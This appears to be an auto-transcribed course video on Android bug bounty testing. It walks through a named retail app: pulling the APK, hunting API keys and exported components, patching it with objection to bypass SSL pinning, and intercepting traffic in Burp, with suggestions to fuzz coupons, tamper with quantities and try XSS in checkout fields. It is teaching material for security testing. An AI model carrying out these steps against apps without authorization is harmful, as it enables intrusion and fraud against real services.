00:00:31.240 --> 00:00:33.200
I've had this error on a lot of

12
00:00:33.200 --> 00:00:36.440
applications when doing bug bounty hunts and also

13
00:00:36.440 --> 00:00:39.480
when looking at other applications as well.

14
00:00:39.820 --> 00:00:41.360
This is a common error that you can

15
00:00:41.360 --> 00:00:44.540
get when you're dealing with a kotlin application,

16
00:00:44.960 --> 00:00:46.700
and the reason for that is that kotlin

17
00:00:46.700 --> 00:00:49.940
applications, instead of using the default apt version

18
00:00:49.940 --> 00:00:53.080
1, they're actually using apt version 2.

19
00:00:53.080 --> 00:00:55.780
We can actually specify this when we're patching

20
00:00:55.780 --> 00:00:59.800
an application with objection by doing something like

21
00:00:59.800 --> 00:01:03.420
objection patch apk, dash s, let's say our

22
00:01:03.420 --> 00:01:06.340
apk name is just blada apk, then we

23
00:01:06.340 --> 00:01:09.520
can add a special flag here, dash dash

24
00:01:09.520 --> 00:01:13.540
use, dash aapt2, and this will help to

25
00:01:13.540 --> 00:01:15.340
remediate that issue for you.

26
00:01:15.660 --> 00:01:18.120
Your application should patch just fine after you

27
00:01:18.120 --> 00:01:19.060
include this flag.

28
00:01:19.060 --> 00:01:22.100
If you get that slash res navigation, unable

29
00:01:22.100 --> 00:01:23.400
to decode error.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 7: Android-Bug-Bounty-Hunt

WEBVTT

1
00:00:00.480 --> 00:00:01.960
(Transcribed by TurboScribe. Go Unlimited to remove this message.) All right, so let's get started with our

2
00:00:01.960 --> 00:00:03.960
very first bug bounty hunt where we're going

3
00:00:03.960 --> 00:00:07.460
to put everything together into one continuous video

4
00:00:07.460 --> 00:00:08.980
so you can see how I go about

5
00:00:08.980 --> 00:00:11.820
the pen testing process and how I do

6
00:00:11.820 --> 00:00:13.820
everything all in one go.

7
00:00:14.060 --> 00:00:15.160
So I'm going to go to the Google

8
00:00:15.160 --> 00:00:18.580
Play Store here on my APK Puller phone.

9
00:00:20.000 --> 00:00:22.000
Looks like I need to reset my proxy

10
00:00:22.000 --> 00:00:24.080
settings here because I'm getting it cancelled.

11
00:00:26.040 --> 00:00:29.720
Get rid of my proxy and we're going

12
00:00:29.720 --> 00:00:30.800
to refresh this now.

13
00:00:32.000 --> 00:00:34.560
All right, so I think I am going

14
00:00:34.560 --> 00:00:37.200
to go with just a random app that

15
00:00:37.200 --> 00:00:38.000
I can find.

16
00:00:38.680 --> 00:00:40.960
Let's do some kind of a shopping app

17
00:00:40.960 --> 00:00:41.500
or something.

18
00:00:41.660 --> 00:00:42.980
How does Kohl's sound?

19
00:00:43.120 --> 00:00:44.220
Let's do Kohl's.

20
00:00:45.080 --> 00:00:50.660
If they have anything here, Kohl's Fitness.

21
00:00:50.820 --> 00:00:52.880
Let's do Joanne Shopping and Fabrics.

22
00:00:52.940 --> 00:00:53.780
This looks like fun.

23
00:00:55.620 --> 00:00:57.940
Okay, I need to complete my account setup

24
00:00:57.940 --> 00:00:58.600
here.

25
00:00:58.820 --> 00:01:00.220
No, I don't need to add a credit

26
00:01:00.220 --> 00:01:00.580
card.

27
00:01:01.220 --> 00:01:03.780
It's going to download the Joanne Shopping app.

28
00:01:04.340 --> 00:01:06.640
This is used for shopping and crafts in

29
00:01:06.640 --> 00:01:07.440
the United States.

30
00:01:07.600 --> 00:01:09.600
I don't know if there's Joanne Fabrics in

31
00:01:09.600 --> 00:01:12.720
other countries, but this is a nice place

32
00:01:12.720 --> 00:01:14.720
for people who are crafty who might go

33
00:01:14.720 --> 00:01:17.000
out shopping at Joanne Fabrics.

34
00:01:17.600 --> 00:01:19.200
I'm going to wait just a minute for

35
00:01:19.200 --> 00:01:20.400
this to install.

36
00:01:24.710 --> 00:01:26.450
Okay, now it's installed.

37
00:01:26.530 --> 00:01:29.110
Let's just make sure the application boots up

38
00:01:29.110 --> 00:01:29.590
properly.

39
00:01:32.450 --> 00:01:33.910
Okay, and you can see we're kind of

40
00:01:33.910 --> 00:01:36.950
on this onboarding activity here where it's going

41
00:01:36.950 --> 00:01:38.710
to tell us how to use the application.

42
00:01:39.250 --> 00:01:40.670
Everything's working good here.

43
00:01:40.950 --> 00:01:42.250
So the next thing that we need to

44
00:01:42.250 --> 00:01:44.530
do is go to our terminal and we

45
00:01:44.530 --> 00:01:46.630
need to, let me clear this out for

46
00:01:46.630 --> 00:01:53.010
you, we need to pull the application off

47
00:01:53.010 --> 00:01:54.010
of the Android phone.

48
00:01:54.090 --> 00:01:55.590
So we're going to do our adb shell.

49
00:01:55.810 --> 00:01:57.090
So we have our shell.

50
00:01:57.370 --> 00:01:59.890
Now I'm going to do a pm list

51
00:01:59.890 --> 00:02:04.010
packages and we're going to grep for Joanne.

52
00:02:05.290 --> 00:02:08.389
So here we go, fifth finger clients Joanne

53
00:02:08.389 --> 00:02:09.150
Fabrics.

54
00:02:10.690 --> 00:02:12.090
I'm going to copy this.

55
00:02:14.000 --> 00:02:16.580
Now we're going to do a pm path

56
00:02:16.580 --> 00:02:19.320
and the name of our package.

57
00:02:23.220 --> 00:02:26.280
Okay, so this is our entire app right

58
00:02:26.280 --> 00:02:26.660
here.

59
00:02:27.580 --> 00:02:28.880
I copy this.

60
00:02:28.940 --> 00:02:30.320
I'm going to do an exit to get

61
00:02:30.320 --> 00:02:31.520
out of our adb shell.

62
00:02:31.740 --> 00:02:33.700
Now I'm going to do an adb pull.

63
00:02:34.480 --> 00:02:37.880
Let me back up a few directories here.

64
00:02:42.120 --> 00:02:44.260
I'm going to put this into my apk

65
00:02:44.260 --> 00:02:45.340
projects directory.

66
00:02:47.530 --> 00:02:50.050
Yeah, I'll do an adb pull and the

67
00:02:50.050 --> 00:02:52.610
name of our path there.

68
00:02:59.880 --> 00:03:00.340
I'll paste.

69
00:03:03.100 --> 00:03:06.180
Okay, I'm going to go there in my

70
00:03:06.180 --> 00:03:08.600
file explorer and actually rename that file.

71
00:03:08.720 --> 00:03:10.440
I'm not happy with how I did that.

72
00:03:15.030 --> 00:03:18.810
Actually, let's go back one more directory and

73
00:03:18.810 --> 00:03:22.530
cd to apk folder here.

74
00:03:29.090 --> 00:03:31.070
Sorry, this is just me putting things in

75
00:03:31.070 --> 00:03:32.770
a proper place so I know exactly where

76
00:03:32.770 --> 00:03:33.170
they are.

77
00:03:33.350 --> 00:03:35.150
I'm going to do this adb pull again

78
00:03:35.150 --> 00:03:37.470
so that I can rename this to joanne

79
00:03:37.470 --> 00:03:42.370
.apk. Okay, and now we can see this

80
00:03:42.370 --> 00:03:45.570
in my folder joanne.apk. I'm going to

81
00:03:45.570 --> 00:03:46.670
open JADX now.

82
00:03:49.260 --> 00:03:51.560
We're going to start our static analysis process

83
00:03:51.560 --> 00:03:52.160
right away.

84
00:03:52.280 --> 00:03:53.780
You can see my apk folder.

85
00:03:53.940 --> 00:03:59.720
We have joanne.apk. I'm going to blow

86
00:03:59.720 --> 00:04:00.960
up JADX here.

87
00:04:02.840 --> 00:04:04.360
Okay, and here we go.

88
00:04:04.580 --> 00:04:06.280
So first thing we want to check, of

89
00:04:06.280 --> 00:04:08.840
course, is going to be the androidmanifest.xml.

90
00:04:09.240 --> 00:04:10.420
Check out what's in there.

91
00:04:10.740 --> 00:04:12.920
We can see the min sdk version is

92
00:04:12.920 --> 00:04:13.900
version 21.

93
00:04:14.800 --> 00:04:17.899
This application has a lot of permissions associated

94
00:04:17.899 --> 00:04:18.320
with it.

95
00:04:18.420 --> 00:04:21.640
Internet access, network state, read external storage, write

96
00:04:21.640 --> 00:04:26.580
external storage, camera, course location, find location, some

97
00:04:26.580 --> 00:04:28.260
push io messaging things.

98
00:04:28.340 --> 00:04:30.220
I don't know what all of these have

99
00:04:30.220 --> 00:04:31.720
to do with everything.

100
00:04:31.840 --> 00:04:34.720
There's bluetooth admin, quite a number of permissions

101
00:04:34.720 --> 00:04:35.160
here.

102
00:04:36.080 --> 00:04:37.940
Okay, next thing I would say we want

103
00:04:37.940 --> 00:04:39.920
to do is look for anything that is

104
00:04:39.920 --> 00:04:41.460
exported equals true.

105
00:04:42.100 --> 00:04:44.720
We do have a file provider here so

106
00:04:44.720 --> 00:04:47.020
maybe some files are being served by the

107
00:04:47.020 --> 00:04:50.380
application but it's not exported so that's good.

108
00:04:51.200 --> 00:04:52.600
Scroll down a bit more.

109
00:04:52.600 --> 00:04:56.020
This main activity is here.

110
00:04:57.560 --> 00:05:01.900
We have some kind of android geo api

111
00:05:01.900 --> 00:05:06.180
key here in the androidmanifest.xml. Looks like

112
00:05:06.180 --> 00:05:08.760
an android or a google maps api key.

113
00:05:09.960 --> 00:05:11.620
Scroll down a bit more.

114
00:05:13.020 --> 00:05:15.120
There's some different links and stuff here for

115
00:05:15.120 --> 00:05:17.840
testing different applications that might be out there

116
00:05:17.840 --> 00:05:20.460
in the world for joannfabrics.

117
00:05:25.050 --> 00:05:26.730
I'm going to keep on looking down through

118
00:05:26.730 --> 00:05:27.130
here.

119
00:05:29.090 --> 00:05:32.870
Here's some .io sdk branch keys.

120
00:05:33.070 --> 00:05:37.390
These are usually used for managing the different

121
00:05:37.390 --> 00:05:39.370
versions of the application that are out there.

122
00:05:39.430 --> 00:05:41.910
These are generally not that sensitive but I

123
00:05:41.910 --> 00:05:43.610
definitely recommend you do your own research.

124
00:05:43.730 --> 00:05:45.330
I'm not going to go through everything that

125
00:05:45.330 --> 00:05:46.730
I can possibly find here.

126
00:05:48.470 --> 00:05:50.930
Just doing a quick rundown of the android

127
00:05:50.930 --> 00:05:51.630
manifest.

128
00:05:52.990 --> 00:05:55.530
Here's an export equals true for this firebase

129
00:05:55.530 --> 00:05:59.820
provider tag manager service.

130
00:06:02.180 --> 00:06:06.240
Lots of things in this androidmanifest.xml. You

131
00:06:06.240 --> 00:06:08.440
can see there's some things here that are

132
00:06:08.440 --> 00:06:10.720
checking to see how low the battery is

133
00:06:10.720 --> 00:06:12.360
so there might be some functionality in the

134
00:06:12.360 --> 00:06:14.780
application checking your battery state.

135
00:06:18.940 --> 00:06:20.900
At this point I would definitely make a

136
00:06:20.900 --> 00:06:23.080
note of all those different api keys.

137
00:06:23.500 --> 00:06:25.780
Let's just do a quick search here equals

138
00:06:25.780 --> 00:06:28.640
true for anything else that might be exported

139
00:06:28.640 --> 00:06:29.040
here.

140
00:06:29.700 --> 00:06:32.880
So with the push io activity launcher probably

141
00:06:32.880 --> 00:06:35.600
for pushing notifications things like that.

142
00:06:35.820 --> 00:06:38.500
We have the mygcm receiver here that is

143
00:06:38.500 --> 00:06:39.780
exported equals true.

144
00:06:43.240 --> 00:06:51.340
Some api revocation service firebase messaging firebase firebase

145
00:06:51.340 --> 00:06:55.200
tag manager and that looks that's pretty much

146
00:06:55.200 --> 00:06:57.500
it for anything that is exported here.

147
00:06:57.640 --> 00:06:58.460
The bind job.

148
00:07:00.160 --> 00:07:02.620
Yep that's about it for all the exported

149
00:07:02.620 --> 00:07:03.360
activities.

150
00:07:04.340 --> 00:07:06.700
Let's go and actually take a look real

151
00:07:06.700 --> 00:07:12.810
quick into the strings.xml. So res values

152
00:07:12.810 --> 00:07:18.210
strings.xml. Okay we have some quantum uuid

153
00:07:18.210 --> 00:07:21.110
that is probably some kind of user id

154
00:07:21.110 --> 00:07:23.310
utilized to gain access to something.

155
00:07:23.850 --> 00:07:26.170
A sub maybe this is some subscription service

156
00:07:26.170 --> 00:07:28.050
or something for joannfabrics.

157
00:07:30.600 --> 00:07:34.020
Looking down here just quickly scrolling through the

158
00:07:34.020 --> 00:07:43.380
strings.xml. Some kind of an interesting hotfix

159
00:07:43.380 --> 00:07:43.980
thing here.

160
00:07:44.760 --> 00:07:47.780
Here's a firebase database this is something you

161
00:07:47.780 --> 00:07:49.620
would want to look up and also you

162
00:07:49.620 --> 00:07:52.160
would want to run firebase enum to try

163
00:07:52.160 --> 00:07:54.260
to find any other firebases that are out

164
00:07:54.260 --> 00:07:54.520
there.

165
00:07:54.900 --> 00:07:57.440
Let's just open a google chrome window real

166
00:07:57.440 --> 00:08:01.820
quick and see if we can do the

167
00:08:01.820 --> 00:08:03.280
slash dot json trick.

168
00:08:06.340 --> 00:08:08.540
Permission denied so we know that is secure

169
00:08:08.540 --> 00:08:10.240
at least from that directory level.

170
00:08:11.360 --> 00:08:13.020
So you would definitely take a note of

171
00:08:13.020 --> 00:08:14.280
the firebase database.

172
00:08:14.920 --> 00:08:16.500
Do some looking on that.

173
00:08:17.540 --> 00:08:20.100
Looks like there's some mobile.conf settings kind

174
00:08:20.100 --> 00:08:20.740
of thing here.

175
00:08:22.990 --> 00:08:24.430
Scrolling down a bit more we have our

176
00:08:24.430 --> 00:08:26.350
google api keys which we kind of saw

177
00:08:26.350 --> 00:08:31.620
before in the androidmanifest.xml. Some things about

178
00:08:31.620 --> 00:08:35.000
the format of the email addresses as well

179
00:08:35.000 --> 00:08:37.059
as phone numbers things like that.

180
00:08:41.669 --> 00:08:46.640
Scrolling down a bit more here's a push

181
00:08:46.640 --> 00:08:48.460
io app key.

182
00:08:48.660 --> 00:08:49.940
You're gonna have to do research on that

183
00:08:49.940 --> 00:08:50.700
by yourself.

184
00:08:51.640 --> 00:08:53.500
Not going to really show how to exploit

185
00:08:53.500 --> 00:08:55.660
any of that stuff but just highlighting some

186
00:08:55.660 --> 00:08:57.220
things that are easy to find here.

187
00:09:03.930 --> 00:09:10.010
Okay all right so now let's set up

188
00:09:10.010 --> 00:09:13.790
our phone to actually be intercepted with burp.

189
00:09:13.970 --> 00:09:15.510
I'm just going to go to my settings

190
00:09:15.510 --> 00:09:18.570
here and re-enable my proxy.

191
00:09:19.670 --> 00:09:21.970
Make sure that I'm able to intercept some

192
00:09:21.970 --> 00:09:23.490
traffic using burp here.

193
00:09:24.610 --> 00:09:26.710
Go to my proxy turn that on.

194
00:09:28.950 --> 00:09:29.890
Accept and continue.

195
00:09:30.030 --> 00:09:31.210
No thanks for google.

196
00:09:32.810 --> 00:09:34.710
Do a quick test here see if we

197
00:09:34.710 --> 00:09:36.070
can intercept our traffic.

198
00:09:37.490 --> 00:09:39.790
Okay it looks like the certificate is not

199
00:09:39.790 --> 00:09:40.550
trusted yet.

200
00:09:43.150 --> 00:09:45.130
So let me just drag that certificate over

201
00:09:45.130 --> 00:09:48.790
into our phone from earlier.

202
00:09:54.530 --> 00:09:57.270
So I'm just dragging over my burp tcm

203
00:09:57.270 --> 00:09:59.090
academy certificate from earlier.

204
00:09:59.450 --> 00:10:01.250
I'm going to go to the settings now.

205
00:10:04.550 --> 00:10:06.570
Turn off intercept for burp for a second.

206
00:10:08.940 --> 00:10:14.240
Here it's going be under security advanced encryption

207
00:10:14.240 --> 00:10:15.260
and credentials.

208
00:10:20.290 --> 00:10:21.850
Install from sd card.

209
00:10:24.350 --> 00:10:26.790
Downloads burp tcm academy here.

210
00:10:27.310 --> 00:10:28.210
Name this burp.

211
00:10:32.590 --> 00:10:33.590
Click okay.

212
00:10:37.480 --> 00:10:38.740
Go to my trusted credentials.

213
00:10:38.840 --> 00:10:39.940
Make sure that applied.

214
00:10:40.780 --> 00:10:41.540
Yep looks good.

215
00:10:41.620 --> 00:10:42.820
Let's go back to google chrome.

216
00:10:42.900 --> 00:10:44.900
Make sure we can intercept some traffic here.

217
00:10:52.520 --> 00:10:53.800
Okay it looks good.

218
00:10:53.900 --> 00:10:55.980
We're intercepting a bunch of encrypted traffic.

219
00:10:57.760 --> 00:10:59.740
I'm going to turn my intercept off.

220
00:11:04.920 --> 00:11:06.980
Get rid of this and now I'm going

221
00:11:06.980 --> 00:11:09.040
to open up the joann fabrics app and

222
00:11:09.040 --> 00:11:10.860
see if we can intercept some traffic or

223
00:11:10.860 --> 00:11:11.940
if it crashes here.

224
00:11:13.460 --> 00:11:14.840
Next, next, next.

225
00:11:15.540 --> 00:11:17.280
Okay for background location.

226
00:11:18.900 --> 00:11:20.580
I'm going to skip this for now just

227
00:11:20.580 --> 00:11:21.800
to see if we can get some stuff

228
00:11:21.800 --> 00:11:22.540
to work here.

229
00:11:26.970 --> 00:11:35.250
I'm going to look for fabric.

230
00:11:38.840 --> 00:11:40.100
Do a search.

231
00:11:43.590 --> 00:11:45.230
It doesn't seem to be bringing up any

232
00:11:45.230 --> 00:11:47.650
products so it's possible that SSL pinning could

233
00:11:47.650 --> 00:11:48.510
be getting in the way.

234
00:11:50.510 --> 00:11:52.310
Let's go to our weekly ad and try

235
00:11:52.310 --> 00:11:53.610
to find a store here.

236
00:11:55.770 --> 00:12:02.150
I'll do Washington DC.

237
00:12:10.350 --> 00:12:11.850
Okay we can see we're getting like a

238
00:12:11.850 --> 00:12:14.830
bunch of SSL errors and burp suite here.

239
00:12:15.190 --> 00:12:17.530
It's not liking our certificate very much.

240
00:12:18.150 --> 00:12:22.850
So now let's try to actually use objection

241
00:12:22.850 --> 00:12:24.910
to patch this application so we can get

242
00:12:24.910 --> 00:12:25.750
by some of that.

243
00:12:26.270 --> 00:12:31.470
So I'm going to go cd apk documents

244
00:12:31.470 --> 00:12:40.350
then apk folder.

245
00:12:40.850 --> 00:12:41.850
Do a dir here.

246
00:12:42.050 --> 00:12:42.970
List my files.

247
00:12:43.490 --> 00:12:48.670
All right do an objection patch apk source

248
00:12:48.670 --> 00:12:54.390
joann.apk. See if objection is able to

249
00:12:54.390 --> 00:12:55.430
patch this application.

250
00:13:07.010 --> 00:13:08.870
I'm going to look through some more of

251
00:13:08.870 --> 00:13:11.090
these xml files real quick while we wait.

252
00:13:15.130 --> 00:13:17.310
You can obviously use the magic wand now

253
00:13:17.310 --> 00:13:19.610
to look for other things such as passwords

254
00:13:19.610 --> 00:13:23.290
and API keys, things like that.

255
00:13:23.890 --> 00:13:24.430
URLs.

256
00:13:27.590 --> 00:13:28.930
It's going to take a little while to

257
00:13:28.930 --> 00:13:29.910
unpack this I feel.

258
00:13:30.470 --> 00:13:31.990
Okay now I'm going to just look for

259
00:13:31.990 --> 00:13:33.950
things like URLs like we talked about in

260
00:13:33.950 --> 00:13:35.410
the static analysis section.

261
00:13:35.690 --> 00:13:44.230
Look for anything that is HTTP joann.com.

262
00:13:55.680 --> 00:13:57.260
That's it for there.

263
00:14:00.060 --> 00:14:01.980
Not really many URLs there.

264
00:14:02.100 --> 00:14:03.400
Let's try HTTPS.

265
00:14:05.760 --> 00:14:08.320
Okay we have some bizarre voice stuff.

266
00:14:08.440 --> 00:14:10.480
This is kind of used for getting analytics

267
00:14:10.480 --> 00:14:12.840
about customer experience for applications.

268
00:14:14.280 --> 00:14:16.520
Some Google API stuff here.

269
00:14:18.910 --> 00:14:20.550
Still looking, still looking.

270
00:14:21.770 --> 00:14:24.470
Handmade with joann.com slash API.

271
00:14:24.710 --> 00:14:26.490
So this is a new URL that would

272
00:14:26.490 --> 00:14:29.370
be very important that we want to take

273
00:14:29.370 --> 00:14:30.730
some time to look into.

274
00:14:31.130 --> 00:14:33.950
This might be the API endpoint for the

275
00:14:33.950 --> 00:14:34.870
mobile application.

276
00:14:36.010 --> 00:14:38.070
Some stuff about joann mail.

277
00:14:38.610 --> 00:14:40.230
So that's another URL here.

278
00:14:41.110 --> 00:14:43.850
Some loyalty programs, things like that.

279
00:14:46.990 --> 00:14:49.530
Some more URLs for shopping and stuff like

280
00:14:49.530 --> 00:14:49.970
that.

281
00:14:53.690 --> 00:14:55.450
Keep going through the list here.

282
00:14:56.630 --> 00:14:59.970
Some things for developing more joann mail.

283
00:15:01.050 --> 00:15:03.150
Some special Girl Scout stuff.

284
00:15:04.630 --> 00:15:06.230
My account page.

285
00:15:06.530 --> 00:15:08.610
There's going to be an access token here

286
00:15:08.610 --> 00:15:10.310
that's going to be utilized for when you

287
00:15:10.310 --> 00:15:10.970
log in.

288
00:15:11.730 --> 00:15:12.910
You can see that there.

289
00:15:13.510 --> 00:15:15.410
Here is a promo code.

290
00:15:15.530 --> 00:15:17.050
So this is a possible place where we

291
00:15:17.050 --> 00:15:18.790
could try to fuzz coupons.

292
00:15:19.830 --> 00:15:21.630
Let's actually take a look there.

293
00:15:24.090 --> 00:15:26.530
Yep so we have like a bunch of

294
00:15:26.530 --> 00:15:28.130
URLs in this source code.

295
00:15:30.830 --> 00:15:32.790
Privacy pages, things like that.

296
00:15:32.910 --> 00:15:36.210
Some areas where parameters are being passed in

297
00:15:36.210 --> 00:15:37.170
the URL here.

298
00:15:37.650 --> 00:15:40.730
This coupon code thing is obviously a area

299
00:15:40.730 --> 00:15:42.670
to possibly fuzz.

300
00:15:45.370 --> 00:15:47.430
Let's go back to our magic wand.

301
00:15:49.620 --> 00:15:52.360
Some integrations with Pinterest here obviously.

302
00:15:53.680 --> 00:15:55.420
Plus.joann.com.

303
00:15:55.500 --> 00:15:56.920
So that's a new URL we did not

304
00:15:56.920 --> 00:15:57.840
know about before.

305
00:16:01.800 --> 00:16:03.540
So I would definitely be taking notes about

306
00:16:03.540 --> 00:16:04.880
all those kind of things.

307
00:16:07.160 --> 00:16:09.280
And that's it for HTTPS.

308
00:16:09.440 --> 00:16:12.040
Let's look for like API underscore key.

309
00:16:12.760 --> 00:16:12.960
Oops.

310
00:16:22.850 --> 00:16:24.610
So there's some API keys here.

311
00:16:24.770 --> 00:16:26.110
CCT destination.

312
00:16:26.110 --> 00:16:29.410
Not sure what that would necessarily correspond with.

313
00:16:29.590 --> 00:16:31.350
There's a smiles API key.

314
00:16:31.750 --> 00:16:34.510
Some kind of a loyalty program API key.

315
00:16:34.990 --> 00:16:36.150
Crash analytics.

316
00:16:37.990 --> 00:16:40.210
Yep this smiles API key might be something

317
00:16:40.210 --> 00:16:41.050
kind of sensitive.

318
00:16:44.480 --> 00:16:46.700
And that looks like about it in terms

319
00:16:46.700 --> 00:16:47.680
of API key.

320
00:16:52.480 --> 00:16:53.740
Let's look for coupon here.

321
00:16:53.800 --> 00:16:55.100
See if we can find any hard-coded

322
00:16:55.100 --> 00:16:56.820
coupon codes or anything like that.

323
00:16:56.900 --> 00:16:59.080
Oh there's like 2500 results.

324
00:16:59.840 --> 00:17:01.540
Let's take a quick look and see if

325
00:17:01.540 --> 00:17:03.319
our objection finished patching.

326
00:17:04.819 --> 00:17:06.240
Looks like it should be done.

327
00:17:07.660 --> 00:17:12.440
Let's uninstall this application from our Android phone.

328
00:17:17.250 --> 00:17:18.990
Drag it up and uninstall.

329
00:17:19.569 --> 00:17:20.530
Yep that's fine.

330
00:17:21.970 --> 00:17:24.670
Now over here we'll do an adb install

331
00:17:24.670 --> 00:17:32.630
joann.objection.apk. And it looks like we

332
00:17:32.630 --> 00:17:34.770
failed to parse our certificates.

333
00:17:36.870 --> 00:17:38.250
So that did not work.

334
00:17:38.310 --> 00:17:40.430
But we can also do this manually obviously

335
00:17:40.430 --> 00:17:42.410
following the process from before.

336
00:17:42.610 --> 00:17:44.730
I'll cut the video now and come back

337
00:17:44.730 --> 00:17:46.090
with a patched APK.

338
00:17:46.650 --> 00:17:48.350
Okay so now that I have a successfully

339
00:17:48.350 --> 00:17:51.750
patched Joann Fabrics application, let's actually start looking

340
00:17:51.750 --> 00:17:53.210
at some of this network traffic.

341
00:17:53.630 --> 00:17:55.630
I'm going to click the Joann Fabrics application.

342
00:17:55.970 --> 00:17:57.570
And now in my terminal here I need

343
00:17:57.570 --> 00:18:00.170
to run objection explore to hook to the

344
00:18:00.170 --> 00:18:02.850
Frida gadget that we injected into the application.

345
00:18:03.350 --> 00:18:05.770
And now I'm going to do android ssl

346
00:18:05.770 --> 00:18:06.290
pinning.

347
00:18:07.170 --> 00:18:07.690
Disable.

348
00:18:08.330 --> 00:18:09.750
And this is going to allow us to

349
00:18:09.750 --> 00:18:12.070
start intercepting traffic here with Burp Suite.

350
00:18:12.510 --> 00:18:14.670
And we can see this new URL here

351
00:18:14.670 --> 00:18:19.430
handmadewithjoann.com on port 4043 or 443.

352
00:18:19.510 --> 00:18:21.570
You can see that we're calling some new

353
00:18:21.570 --> 00:18:23.050
API locations here.

354
00:18:23.150 --> 00:18:25.570
We're calling with some different stuff in the

355
00:18:25.570 --> 00:18:25.890
body.

356
00:18:26.150 --> 00:18:27.470
I'm just going to forward along some of

357
00:18:27.470 --> 00:18:29.710
these requests and see if we can actually

358
00:18:29.710 --> 00:18:32.270
intercept like a search query or anything like

359
00:18:32.270 --> 00:18:32.590
that.

360
00:18:33.450 --> 00:18:35.510
So I'm going to go to search here.

361
00:18:36.530 --> 00:18:38.150
You can see that this is going to

362
00:18:38.150 --> 00:18:39.210
some new places.

363
00:18:39.710 --> 00:18:41.270
I'm going to look for I don't know

364
00:18:41.270 --> 00:18:41.930
I guess fabric.

365
00:18:43.350 --> 00:18:45.890
Okay we can see some firebase logging going

366
00:18:45.890 --> 00:18:46.550
on here.

367
00:18:46.990 --> 00:18:49.310
And now we see our search term for

368
00:18:49.310 --> 00:18:49.870
fabric.

369
00:18:50.090 --> 00:18:51.710
I'm going to forward that request along.

370
00:18:51.850 --> 00:18:52.710
See what we get back.

371
00:18:52.770 --> 00:18:54.550
Let's look at some alphabet fabrics.

372
00:18:57.210 --> 00:18:59.570
Obviously with Burp Suite as we're intercepting these

373
00:18:59.570 --> 00:19:02.710
things in the HTTP history and also the

374
00:19:02.710 --> 00:19:04.550
target scope here in the sitemap.

375
00:19:04.630 --> 00:19:06.970
It's going to show you everything that's intercepted

376
00:19:06.970 --> 00:19:09.670
and where it goes along with the URL

377
00:19:09.670 --> 00:19:11.710
like handmadewithjoann.com.

378
00:19:11.870 --> 00:19:14.030
We have some APIs here obviously like a

379
00:19:14.030 --> 00:19:14.730
user API.

380
00:19:14.990 --> 00:19:18.110
There could be category images, APIs, other APIs

381
00:19:18.110 --> 00:19:20.230
associated with this URL as well.

382
00:19:22.690 --> 00:19:24.170
I'm just going to turn off my intercept

383
00:19:24.170 --> 00:19:25.910
for now and just kind of walk through

384
00:19:25.910 --> 00:19:26.750
the application.

385
00:19:28.310 --> 00:19:31.150
Obviously you can add things to your usually

386
00:19:31.150 --> 00:19:33.030
this is like a bag but for Joann

387
00:19:33.030 --> 00:19:34.950
Fabrics I guess it's a I guess it's

388
00:19:34.950 --> 00:19:37.230
a cart or usually this is a cart

389
00:19:37.230 --> 00:19:38.210
but this is a bag.

390
00:19:38.850 --> 00:19:40.030
So I'm just going to add this to

391
00:19:40.030 --> 00:19:41.950
my bag, see if there's some other API

392
00:19:41.950 --> 00:19:44.390
requests that might come up here in our

393
00:19:44.390 --> 00:19:45.110
scope.

394
00:19:46.630 --> 00:19:48.710
Yeah like here we have shop and locations

395
00:19:48.710 --> 00:19:50.430
and all kinds of things like that.

396
00:19:50.530 --> 00:19:52.110
So this would be a target that you

397
00:19:52.110 --> 00:19:54.450
want to look at in terms of the

398
00:19:54.450 --> 00:19:56.590
API gateway for this application.

399
00:19:57.910 --> 00:20:00.650
Obviously you can try to manipulate things like

400
00:20:00.650 --> 00:20:04.850
changing these quantities to something huge using sorry

401
00:20:04.850 --> 00:20:06.110
Burp Suite as a proxy.

402
00:20:06.330 --> 00:20:09.270
Turn my intercept back on, click done here.

403
00:20:15.460 --> 00:20:17.120
You can try checking out with guest and

404
00:20:17.120 --> 00:20:20.420
trying to manipulate some variables as well.

405
00:20:20.920 --> 00:20:24.260
I can do the guest checkout here, see

406
00:20:24.260 --> 00:20:25.820
if there's anything that I can try to

407
00:20:25.820 --> 00:20:26.300
manipulate.

408
00:20:26.820 --> 00:20:29.640
Like for example when I'm providing my first

409
00:20:29.640 --> 00:20:31.540
name, my last name, my address, I could

410
00:20:31.540 --> 00:20:33.800
try things like cross-site scripting payloads in

411
00:20:33.800 --> 00:20:37.520
there or something malicious to see if you

412
00:20:37.520 --> 00:20:40.140
know something gets triggered back to my machine

413
00:20:40.140 --> 00:20:43.000
or gets triggered onto the actual Joann Fabrics

414
00:20:43.000 --> 00:20:44.140
website from here.

415
00:20:44.820 --> 00:20:46.740
Something else that I would definitely do for

416
00:20:46.740 --> 00:20:49.800
an application like this, since we know based

417
00:20:49.800 --> 00:20:54.140
off of the androidmanifest.xml, which I'm heading

418
00:20:54.140 --> 00:20:58.080
to on my other screen here, this application

419
00:20:58.080 --> 00:21:00.580
will support min SDK 21.

420
00:21:01.240 --> 00:21:03.040
And I could look through the device file

421
00:21:03.040 --> 00:21:05.620
explorer here in Android Studio if I wanted

422
00:21:05.620 --> 00:21:07.420
to try to find anything related to this

423
00:21:07.420 --> 00:21:08.680
Joann Fabrics app.

424
00:21:09.680 --> 00:21:11.380
Let's see if we can find it here.

425
00:21:12.460 --> 00:21:15.680
Here it is, fifth finger clients Joann, but

426
00:21:15.680 --> 00:21:17.260
the problem here is that we're running this

427
00:21:17.260 --> 00:21:19.340
again on our API 29.

428
00:21:19.780 --> 00:21:22.120
So I could actually close my emulator if

429
00:21:22.120 --> 00:21:24.760
I wanted to, open my other emulator, which

430
00:21:24.760 --> 00:21:29.100
I'll demonstrate right now, and install the application

431
00:21:29.100 --> 00:21:30.180
on that instead.

432
00:21:33.440 --> 00:21:35.820
And this might allow me to obviously root

433
00:21:35.820 --> 00:21:37.120
the device, which is going to let me

434
00:21:37.120 --> 00:21:38.620
see the entire file system.

435
00:21:38.620 --> 00:21:42.480
Now I'm going to drag my Joann Fabrics

436
00:21:42.480 --> 00:21:44.380
patched application over there.

437
00:21:45.300 --> 00:21:48.260
One second, just going through my file system.

438
00:21:49.480 --> 00:21:52.220
Okay, so this is my Joann Fabrics patched

439
00:21:52.220 --> 00:21:52.760
APK.

440
00:21:57.320 --> 00:21:59.360
It's going to go ahead and install that.

441
00:22:00.780 --> 00:22:03.520
And remember, this is a rooted device technically,

442
00:22:03.760 --> 00:22:05.080
so we'll be able to see the entire

443
00:22:05.080 --> 00:22:06.920
file system and see what kind of things

444
00:22:06.920 --> 00:22:09.600
this is storing while the application is actually
